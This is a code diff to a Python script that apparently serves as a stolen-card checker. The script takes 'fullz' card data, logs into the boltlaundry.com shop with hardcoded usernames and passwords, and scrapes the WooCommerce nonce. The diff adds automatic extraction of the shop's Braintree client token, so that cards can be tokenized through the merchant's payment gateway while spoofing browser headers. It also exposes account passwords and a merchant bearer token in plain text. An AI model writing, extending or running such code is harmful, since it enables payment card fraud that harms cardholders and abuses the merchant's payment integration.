@@ -1,9 +1,12 @@
 import os
+import base64
 import re
 import time
 import json
 import asyncio
-import json
+import random
+import uuid
+from fake_useragent import UserAgent
 from html import unescape
 from bs4 import BeautifulSoup
 
@@ -44,6 +47,22 @@ def gets(s: str, start: str, end: str) -> str | None:
         return s[start_index:end_index]
     except ValueError:
         return None
+    
+def extract_braintree_token(response_text):
+    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
+    match = re.search(pattern, response_text)
+    if not match:
+        return None
+
+    token_base64 = match.group(1)
+
+    try:
+        decoded_json = base64.b64decode(token_base64).decode('utf-8')
+        data = json.loads(decoded_json)
+        return data
+    except Exception as e:
+        print(f"Error decoding or parsing JSON token: {e}")
+        return None
 
 # CREATE PAYMENT METHOD WITH EXPIRY VALIDATION (revised to continue even if expiry invalid)
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
@@ -75,9 +94,9 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'if-modified-since': 'Wed, 27 Aug 2025 23:56:55 GMT',
+            'if-modified-since': 'Fri, 29 Aug 2025 04:27:39 GMT',
             'priority': 'u=0, i',
-            'referer': 'https://boltlaundry.com/my-account/edit-address/',
+            'referer': 'https://boltlaundry.com/',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -115,8 +134,8 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         data = {
             'ihcaction': 'login',
             'ihc_login_nonce': login,
-            'log': 'MiahOrtega19',
-            'pwd': 'Miah190',
+            'log': 'DianaMor',
+            'pwd': 'DianaMorrison1209',
         }
 
         response = await session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data)
@@ -178,10 +197,15 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
 
         nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
 
+        # Ambil token wc_braintree_client_token otomatis
+        token_data = extract_braintree_token(response.text)
+        if token_data is not None:
+            authorization_fingerprint = token_data.get('authorizationFingerprint')
+
         headers = {
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY0NTE4NTAsImp0aSI6ImZjYWM1YjFmLTllNjYtNDRkNy1iOTQxLTIxY2ZjZGMzNGVjMyIsInN1YiI6IjYzY21iM253Ym5wcjNmOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjYzY21iM253Ym5wcjNmOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJvbHRsYXVuZHJ5c2VydmljZV9pbnN0YW50IiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMjA4MDUzMjc0MDIxNTM2MDM3NSIsInBheXBhbF9jbGllbnRfaWQiOiJBUmZiOHktVEE4SEVVYkhNaG84dG9RZ2Z3RTVFMVFLSUJaZDZ4c1JhRFZJeUlCcDAtUTZIMnhyOFZZYThGVTU3R1VCUE9aUl9fZHJuUWNJZSJ9fQ.VR4_QVw2rYKvDyCdRD91Dqb8KefYKJEvmhTBax8QVxJQeROGjfYaqkKlYZtEfTmDtiQoIAYRJz6xBB35sXxEnA',
+            'authorization': f'Bearer {authorization_fingerprint}',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
             'origin': 'https://assets.braintreegateway.com',
@@ -200,7 +224,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'clientSdkMetadata': {
                 'source': 'client',
                 'integration': 'custom',
-                'sessionId': 'eae984cb-abc4-406f-a9c0-a1c1d9b906b5',
+                'sessionId': '1434c429-71ba-4695-b174-a720a6f1fcc6',
             },
             'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
             'variables': {
